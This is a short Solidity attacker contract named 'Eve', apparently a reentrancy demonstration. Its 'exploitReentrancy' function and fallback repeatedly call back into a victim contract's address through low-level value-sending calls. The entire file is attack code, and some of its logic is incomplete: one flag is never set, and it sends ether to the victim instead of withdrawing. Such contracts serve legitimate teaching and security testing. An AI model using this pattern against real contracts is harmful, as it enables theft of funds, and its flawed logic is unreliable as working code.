pragma solidity ^0.4.19;

contract Eve {

  
       bool public alreadyCalled;
       uint public tokenAmount;
       bool useReentrancy;
       address victim;
       event fallbackCalled(uint amount, bool useReentrancy);
       uint numberOfReentrantCalls;
       uint n;
       
       function Eve() public payable {}

   
    
    function exploitReentrancy(address _a, uint _amount, uint _n) public {
        numberOfReentrantCalls = 0;
        n = _n;
        tokenAmount = _amount;
        victim = _a;
        
        victim.call.value(_amount)();
        }

  


    
    function() payable public {
        fallbackCalled(tokenAmount, useReentrancy);
        if(n>0) {
            
        if(numberOfReentrantCalls >= n) {
            return;
       }
        numberOfReentrantCalls++;
       
        victim.call.value(tokenAmount)();
        
       }

        
    }
    
    
    /*
    function() public payable {
        
    }
    */
    
    
    
}
